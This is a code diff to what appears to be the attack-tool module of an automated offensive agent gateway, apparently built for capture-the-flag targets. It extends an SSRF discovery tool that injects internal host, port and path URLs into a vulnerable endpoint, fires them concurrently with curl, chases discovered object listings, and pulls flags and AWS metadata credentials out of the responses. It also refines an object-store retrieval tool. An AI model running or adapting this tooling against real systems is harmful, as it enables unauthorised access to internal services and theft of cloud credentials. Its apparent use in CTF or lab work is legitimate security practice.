@@ -659,6 +659,9 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         paths: str = "/,/flag,/flag.txt,/admin,/api,/health,/status,/metadata",
         method: str = "GET",
         max_probes: int = 30,
+        probe_timeout: float = 5.0,
+        max_duration: float = 120.0,
+        concurrency: int = 4,
     ) -> ToolResult:
         """Discover internal services through an SSRF vector.
 
@@ -693,6 +696,9 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                     hosts.append(_dh)
         port_list = [p.strip() for p in ports.split(",") if p.strip()]
         path_list = [p.strip() for p in paths.split(",") if p.strip()]
+        for _priority_path in ("/?key=flag.txt", "/objects/flag.txt"):
+            if _priority_path not in path_list:
+                path_list.append(_priority_path)
 
         # Build probe URLs: if the SSRF endpoint takes a full URL, inject internal targets
         probes: list[str] = []
@@ -719,22 +725,27 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         except (TypeError, ValueError):
             budget = 30
         combinations = [(h, pt, p) for h in hosts[:8]
-                        for pt in port_list[:20] for p in path_list[:8]]
+                        for pt in port_list[:20] for p in path_list[:20]]
         selected: list[tuple[str, str, str]] = []
-        for dimension in range(3):
-            for combo in combinations:
-                if combo in selected:
-                    continue
-                if dimension == 0 and combo[0] not in {c[0] for c in selected}:
-                    selected.append(combo)
-                elif dimension == 1 and combo[1] not in {c[1] for c in selected}:
-                    selected.append(combo)
-                elif dimension == 2 and combo[2] not in {c[2] for c in selected}:
-                    selected.append(combo)
+        priority_paths = ["/", "/flag", "/flag.txt", "/?key=flag.txt", "/objects/flag.txt"]
+        # Seed every host and every discovered port with high-value paths.
+        for h in hosts[:8]:
+            for pt in port_list[:20]:
+                for p in priority_paths:
+                    combo = (h, pt, p)
+                    if combo in combinations and combo not in selected:
+                        selected.append(combo)
+                    if len(selected) >= budget:
+                        break
                 if len(selected) >= budget:
                     break
             if len(selected) >= budget:
                 break
+        for combo in combinations:
+            if len(selected) >= budget:
+                break
+            if combo not in selected:
+                selected.append(combo)
         selected.extend(c for c in combinations if c not in selected)
         selected = selected[:budget]
         probes = []
@@ -742,49 +753,83 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             inner = f"http://{h}:{pt}{p}"
             sep = "&" if "?" in ssrf_url else "?"
             probes.append(f"{ssrf_url}{sep}{url_param}={urllib.parse.quote(inner)}")
+        async def _run_probe(probe_url: str) -> dict:
+            method_flag = "-X POST" if method.upper() == "POST" else ""
+            cmd_line = f"curl -s --max-time {max(1, int(probe_timeout))} {method_flag} '{probe_url}' 2>&1"
+            proc = None
+            try:
+                proc = await asyncio.create_subprocess_shell(
+                    cmd_line, stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE)
+                stdout, stderr = await asyncio.wait_for(
+                    proc.communicate(), timeout=max(1.0, float(probe_timeout) + 2.0))
+                body = stdout.decode("utf-8", errors="replace")
+                import re
+                flag_match = re.search(r"flag\{[^}]+\}", body)
+                keys = re.findall(r'"AccessKeyId"\s*:\s*"([^"]+)"', body)
+                secrets = re.findall(r'"SecretAccessKey"\s*:\s*"([^"]+)"', body)
+                creds = ({"type": "aws_iam", "access_key_id": keys[0],
+                          "secret_access_key": secrets[0][:20] + "..."}
+                         if keys and secrets else None)
+                return {"probe": probe_url, "body": body,
+                        "response_len": len(body), "response_preview": body[:500],
+                        "flag": flag_match.group(0) if flag_match else None,
+                        "credentials_detected": creds,
+                        "error": "" if body.strip() else (stderr.decode(errors="replace")[:200] if stderr else "")}
+            except asyncio.TimeoutError:
+                if proc is not None:
+                    try:
+                        proc.kill()
+                        await proc.wait()
+                    except Exception:
+                        pass
+                return {"probe": probe_url, "body": "", "response_len": 0,
+                        "response_preview": "", "flag": None,
+                        "credentials_detected": None, "error": "timeout"}
+            except Exception as exc:
+                return {"probe": probe_url, "body": "", "response_len": 0,
+                        "response_preview": "", "flag": None,
+                        "credentials_detected": None, "error": str(exc)[:200]}
+
         try:
-            for probe_url in probes:
-                try:
-                    method_flag = "-X POST" if method.upper() == "POST" else ""
-                    cmd_line = f"curl -s --max-time 5 {method_flag} '{probe_url}' 2>&1"
-                    proc = await asyncio.create_subprocess_shell(
-                        cmd_line,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE)
-                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=8)
-                    stdout_s = stdout.decode("utf-8", errors="replace")
-                    if stdout_s.strip():
-                        # Check for flag in response
-                        import re
-                        flag_match = re.search(r'flag\{[^}]+\}', stdout_s)
-                        # IMDS credential detection: look for AWS/GCP/Azure patterns
-                        creds_found = None
-                        imds_keys = re.findall(r'"AccessKeyId"\s*:\s*"([^"]+)"', stdout_s)
-                        imds_secret = re.findall(r'"SecretAccessKey"\s*:\s*"([^"]+)"', stdout_s)
-                        imds_token = re.findall(r'"Token"\s*:\s*"([^"]+)"', stdout_s)
-                        if imds_keys and imds_secret:
-                            creds_found = {
-                                "type": "aws_iam",
-                                "access_key_id": imds_keys[0],
-                                "secret_access_key": imds_secret[0][:20] + "...",
-                                "has_token": bool(imds_token),
-                            }
-                        results.append({
-                            "probe": probe_url,
-                            "response_len": len(stdout_s),
-                            "response_preview": stdout_s[:500],
-                            "flag": flag_match.group(0) if flag_match else None,
-                            "credentials_detected": creds_found,
-                        })
-                        # Stop if flag found
-                        if flag_match:
-                            break
-                except asyncio.TimeoutError:
-                    continue
-                except Exception:
-                    continue
+            sem = asyncio.Semaphore(max(1, min(int(concurrency), 16)))
+            async def _bounded(url: str) -> dict:
+                async with sem:
+                    return await _run_probe(url)
+            deadline = asyncio.get_running_loop().time() + max(1.0, float(max_duration))
+            pending = list(probes)
+            sent_total = 0
+            while pending and asyncio.get_running_loop().time() < deadline:
+                remaining = budget - sent_total
+                if remaining <= 0:
+                    break
+                batch = pending[:min(remaining, max(1, min(int(concurrency), 16)))]
+                pending = pending[len(batch):]
+                sent_total += len(batch)
+                wave = await asyncio.gather(*(_bounded(u) for u in batch))
+                results.extend(wave)
+                if any(r.get("flag") for r in wave):
+                    break
+                # If a response lists objects, prioritize their direct reads
+                # in the remaining budget instead of waiting for a later run.
+                derived = []
+                for item in wave:
+                    try:
+                        data = _json.loads(item.get("body", ""))
+                        names = data.get("objects", []) if isinstance(data, dict) else []
+                        for name in names[:6]:
+                            if isinstance(name, str) and name:
+                                base = item["probe"].split("?", 1)[0]
+                                for suffix in (f"/{name}", f"/?key={urllib.parse.quote(name)}", f"/objects/{name}"):
+                                    derived.append(f"{base}{suffix}")
+                    except Exception:
+                        continue
+                pending = list(dict.fromkeys(derived + pending))[:max(0, budget - sent_total)]
         except Exception:
             pass
+
+        for item in results:
+            item.pop("body", None)
 
         elapsed = (time.perf_counter() - start) * 1000
         if results:
@@ -827,6 +872,9 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "paths": {"type": "string", "description": "Comma-separated paths to probe (default: /,/flag,/flag.txt,/admin,/api)"},
             "method": {"type": "string", "description": "HTTP method: GET or POST. Use POST for services like IMDS that require it (default: GET)"},
             "max_probes": {"type": "integer", "description": "Maximum SSRF requests (1-200, default 30); coverage is distributed across hosts, ports and paths."},
+            "probe_timeout": {"type": "number", "description": "Per-probe timeout in seconds (default 5)."},
+            "max_duration": {"type": "number", "description": "Total probe deadline in seconds (default 120)."},
+            "concurrency": {"type": "integer", "description": "Maximum concurrent probes (1-16, default 4)."},
         },
     )
 
@@ -3073,9 +3121,10 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                 cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
             stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
             out = stdout.decode("utf-8", errors="replace")
-            lines = out.rsplit("\n", 2)
-            status = int(lines[-1].strip()) if lines[-1].strip().isdigit() else 0
-            body = "\n".join(lines[:-2]) if status > 0 else out
+            clean = out.rstrip("\r\n")
+            lines = clean.rsplit("\n", 1)
+            status = int(lines[-1].strip()) if lines and lines[-1].strip().isdigit() else 0
+            body = lines[0] if status > 0 and len(lines) > 1 else clean
             return status, body
 
         # Step 1: if no object_name, fetch root listing to discover objects
@@ -3162,6 +3211,18 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                 if 200 <= status < 300 and body.strip():
                     # Check for flag
                     flag_m = _re.search(r"flag\{[^}]+\}", body)
+                    is_listing = False
+                    try:
+                        parsed_body = _json.loads(body)
+                        is_listing = isinstance(parsed_body, dict) and any(
+                            key in parsed_body for key in ("objects", "files", "keys", "contents", "items")
+                        )
+                    except (ValueError, TypeError):
+                        pass
+                    # A repeated object listing is discovery evidence, not a
+                    # successful retrieval of the requested object.
+                    if is_listing and not flag_m:
+                        continue
                     results.append({
                         "url": url, "status": status,
                         "content": body[:2000],
@@ -3183,6 +3244,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                 tool_name="object_store_get", success=True,
                 stdout=summary, stderr="",
                 exit_code=0, elapsed_ms=elapsed,
+                parsed_output={
+                    "objects_discovered": objects,
+                    "retrieved_objects": [r.get("url", "") for r in results],
+                    "flags": [r.get("flag") for r in results if r.get("flag")],
+                    "attempts": sum(tried_statuses.values()),
+                },
             )
         return ToolResult(
             tool_name="object_store_get", success=False,
@@ -3193,6 +3260,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                 f"Try object_store_get with explicit object_name if the API uses a non-standard path."
             ),
             exit_code=1, elapsed_ms=elapsed,
+            parsed_output={
+                "objects_discovered": objects,
+                "retrieved_objects": [],
+                "flags": [],
+                "attempts": sum(tried_statuses.values()),
+            },
         )
 
     gateway.register(
